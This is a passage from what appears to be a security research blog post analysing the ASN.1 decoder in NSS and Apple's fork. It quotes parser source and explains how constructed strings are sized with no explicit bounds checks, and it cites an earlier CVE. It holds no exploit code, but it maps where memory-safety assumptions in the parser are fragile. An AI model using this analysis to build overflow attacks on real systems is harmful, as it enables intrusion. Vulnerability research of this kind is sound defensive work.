&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; what &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;SEC_ASN1_Identifier&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;break&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;case&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;duringIdentifier&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; consumed &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;sec_asn1d_parse_more_identifier &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; what &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;SEC_ASN1_Identifier&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;break&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;case&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;afterIdentifier&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; sec_asn1d_confirm_identifier &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;break&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;Each state method which could consume input is passed a pointer (&lt;/span&gt;&lt;span class="c7"&gt;buf&lt;/span&gt;&lt;span&gt;) to the next unconsumed byte in the raw input buffer and a count of the remaining unconsumed bytes (&lt;/span&gt;&lt;span class="c7"&gt;len&lt;/span&gt;&lt;span class="c9"&gt;).&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;It&amp;#39;s then up to each of those methods to return how much of the input they consumed, and signal any errors by updating the context object&amp;#39;s &lt;/span&gt;&lt;span class="c7"&gt;status&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;field.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;The parser can be recursive: a state can set its &lt;/span&gt;&lt;span class="c7"&gt;-&amp;gt;place&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;field to a state which expects to handle a parsed child state and then allocate a new child state. For example when parsing an ASN.1 sequence:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.8eeaeea98c81e67701fd5ceeb50d55e628cd74e9"&gt;&lt;/a&gt;&lt;a id="t.7"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;duringSequence&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; state &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;sec_asn1d_push_state &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;top&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;theTemplate &lt;/span&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;dest&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;PR_TRUE&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;The current state sets its own next state to &lt;/span&gt;&lt;span class="c7"&gt;duringSequence&lt;/span&gt;&lt;span&gt;&amp;nbsp;then calls &lt;/span&gt;&lt;span class="c7"&gt;sec_asn1d_push_state&lt;/span&gt;&lt;span&gt;&amp;nbsp;which allocates a new state object, with a new template and a copy of the parent&amp;#39;s &lt;/span&gt;&lt;span class="c7"&gt;dest&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;field.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c7"&gt;sec_asn1d_push_state&lt;/span&gt;&lt;span&gt;&amp;nbsp;updates the context&amp;#39;s &lt;/span&gt;&lt;span class="c7"&gt;current&lt;/span&gt;&lt;span&gt;&amp;nbsp;field such that the next loop around &lt;/span&gt;&lt;span class="c7"&gt;SEC_ASN1DecoderUpdate&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;will see this child state as the current state:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.4abe94039e6236e075539145b72103a31c4c2c18"&gt;&lt;/a&gt;&lt;a id="t.8"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; cx&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;current &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;new_state&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;Note that the initial value of the &lt;/span&gt;&lt;span class="c7"&gt;place&lt;/span&gt;&lt;span&gt;&amp;nbsp;field (which determines the current state) of the newly allocated child is determined by the template. The final state in the state machine path followed by that child will then be responsible for popping itself off the state stack such that the &lt;/span&gt;&lt;span class="c7"&gt;duringSequence&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;state can be reached by its parent to consume the results of the child.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c32 c8 c15" id="h.wuusy9tj5c7g"&gt;&lt;span class="c31 c28"&gt;Buffer management&lt;/span&gt;&lt;/h2&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;The buffer management is where the NSS ASN.1 parser starts to get really mind bending. If you read through the code you will notice an extreme lack of bounds checks when the output buffers are being filled in - there basically are none. For example, &lt;/span&gt;&lt;span class="c7"&gt;sec_asn1d_parse_leaf&lt;/span&gt;&lt;span&gt;&amp;nbsp;which copies the raw encoded string bytes for example simply &lt;/span&gt;&lt;span class="c7"&gt;memcpy&amp;#39;&lt;/span&gt;&lt;span class="c9"&gt;s into the output buffer with no bounds checks that the length of the string matches the size of the buffer.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c9"&gt;Rather than using explicit bounds checks to ensure lengths are valid, the memory safety is instead supposed to be achieved by relying on the fact that decoding valid ASN.1 can never produce output which is larger than its input.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;That is, there are no forms of decompression or input expansion so any parsed output data must be equal to or shorter in length than the input which encoded it. NSS leverages this and over-allocates all output buffers to simply be as large as their inputs.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;For primitive strings this is quite simple: the length and input are provided so there&amp;#39;s nothing really to &lt;/span&gt;&lt;span&gt;go that wrong&lt;/span&gt;&lt;span class="c9"&gt;. But for constructed strings this gets a little fiddly...&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c9"&gt;One way to think of constructed strings is as trees of substrings, nested up to 32-levels deep. Here&amp;#39;s an example:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c9"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTR4nwonetxF1WHDpaUkJme_Ywz-VWc63Qy1j2PJJrAWN0Z7Drcal63h6umti0HFcEaAFlCIH8lmFFGTXkdRsrJ1fAtyzNCAw9c1alni0EPXiAHuRLDBsn0b0FcRRGOzH14wqaOueV_ThhnOWLhuJJbllQChJGfRY5i8VOIEoXsmYOgT4NEfgbs_l_4A/s706/image3%20%281%29.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTR4nwonetxF1WHDpaUkJme_Ywz-VWc63Qy1j2PJJrAWN0Z7Drcal63h6umti0HFcEaAFlCIH8lmFFGTXkdRsrJ1fAtyzNCAw9c1alni0EPXiAHuRLDBsn0b0FcRRGOzH14wqaOueV_ThhnOWLhuJJbllQChJGfRY5i8VOIEoXsmYOgT4NEfgbs_l_4A/s600/image3%20%281%29.png" border="0" alt="An outer constructed definite length string with three children: a primitive string &amp;quot;abc&amp;quot;, a constructed indefinite length string and a primitive string &amp;quot;ghi&amp;quot;. The constructed indefinite string has two children, a primitive string &amp;quot;def&amp;quot; and an end-of-contents marker." style="max-height: 750; max-width: 600;"title="An outer constructed definite length string with three children: a primitive string &amp;quot;abc&amp;quot;, a constructed indefinite length string and a primitive string &amp;quot;ghi&amp;quot;. The constructed indefinite string has two children, a primitive string &amp;quot;def&amp;quot; and an end-of-contents marker." /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c34 c8 c15"&gt;&lt;span class="c27 c26"&gt;An outer constructed definite length string with three children: a primitive string &amp;quot;abc&amp;quot;, a constructed indefinite length string and a primitive string &amp;quot;ghi&amp;quot;. The constructed indefinite string has two children, a primitive string &amp;quot;def&amp;quot; and an end-of-contents marker.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;We start with a constructed definite length string. The string&amp;#39;s length value &lt;/span&gt;&lt;span class="c7"&gt;L&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;is the complete size of the remaining input which makes up this string; that number of input bytes should be parsed as substrings and concatenated to form the parsed output.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;At this point the NSS ASN.1 string parser allocates the output buffer for the parsed output string using the length &lt;/span&gt;&lt;span class="c7"&gt;L&lt;/span&gt;&lt;span&gt;&amp;nbsp;of that first input string. This buffer is an over-allocated worst case. The part which makes it really fun though is that NSS allocates the output buffer then promptly throws away that length! This might not be so obvious from quickly glancing through the code though. The buffer which is allocated is stored as the &lt;/span&gt;&lt;span class="c7"&gt;Data&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;field of a buffer wrapper type:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.a656829ca34a4322a58a35aea96a9b25f2306e10"&gt;&lt;/a&gt;&lt;a id="t.9"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c16"&gt;typedef&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;cssm_data &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; size_t &lt;/span&gt;&lt;span class="c20"&gt;Length&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; uint8_t &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;__nullable &lt;/span&gt;&lt;span class="c20"&gt;Data&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;SecAsn1Item&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;SecAsn1Oid&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;(Recall that we passed in a pointer to a &lt;/span&gt;&lt;span class="c7"&gt;SecAsn1Item&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the template; it&amp;#39;s the &lt;/span&gt;&lt;span class="c30"&gt;Data&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;field of that which gets filled in with the allocated string buffer pointer here. This type is very slightly different between NSS and Apple&amp;#39;s fork, but the difference doesn&amp;#39;t matter here.)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;That &lt;/span&gt;&lt;span class="c7"&gt;Length&lt;/span&gt;&lt;span&gt;&amp;nbsp;field is &lt;/span&gt;&lt;span class="c17"&gt;not&lt;/span&gt;&lt;span&gt;&amp;nbsp;the size of the allocated &lt;/span&gt;&lt;span class="c7"&gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;buffer. It&amp;#39;s a (type-specific) count which determines how many bits or bytes of the buffer pointed to by &lt;/span&gt;&lt;span class="c30"&gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;are valid. I say type-specific because for bit-strings &lt;/span&gt;&lt;span class="c7"&gt;Length&lt;/span&gt;&lt;span&gt;&amp;nbsp;is stored in units of bits but for other strings it&amp;#39;s in units of bytes. (&lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1245528"&gt;CVE-2016-1950&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;was a bug in NSS where the code mixed up those units.)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;Rather than storing the allocated buffer size along with the buffer pointer, each time a substring/child string is encountered the parser walks back up the stack of currently-being-parsed states to find the inner-most definite length string. &lt;/span&gt;&lt;span&gt;As it&amp;#39;s walking up the states it examines each state to determine how much of its input it has consumed in order to be able to determine whether it&amp;#39;s the case that the current to-be-parsed substring is indeed completely enclosed within the inner-most enclosing definite length string.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c9"&gt;If that sounds complicated, it is! The logic which does this is here, and it took me a good few days to pull it apart enough to figure out what this was doing:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.9b3aa6a323d6b6a86a105c4a1b098ad0fb513030"&gt;&lt;/a&gt;&lt;a id="t.10"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;sec_asn1d_state &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;parent &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;sec_asn1d_get_enclosing_construct&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c16"&gt;while&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;parent &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;parent&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;indefinite&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; parent &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;sec_asn1d_get_enclosing_construct&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;parent&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c14"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c16"&gt;unsigned&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;long&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;remaining &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;parent&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;pending&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;parent &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;state&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c16"&gt;do&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(!&lt;/span&gt;&lt;span class="c3"&gt;sec_asn1d_check_and_subtract_length&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;remaining&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;parent&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;consumed&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;top&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;||&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c23"&gt;/* If parent-&amp;gt;indefinite is true, parent-&amp;gt;contents_length is&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* zero and this is a no-op. */&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;!&lt;/span&gt;&lt;span class="c3"&gt;sec_asn1d_check_and_subtract_length&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;remaining&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;parent&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;contents_length&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;top&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;||&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c23"&gt;/* If parent-&amp;gt;indefinite is true, then ensure there is enough&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* space for an EOC tag of 2 bytes. */&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; parent&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;indefinite&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;!&lt;/span&gt;&lt;span class="c3"&gt;sec_asn1d_check_and_subtract_length&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;remaining&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 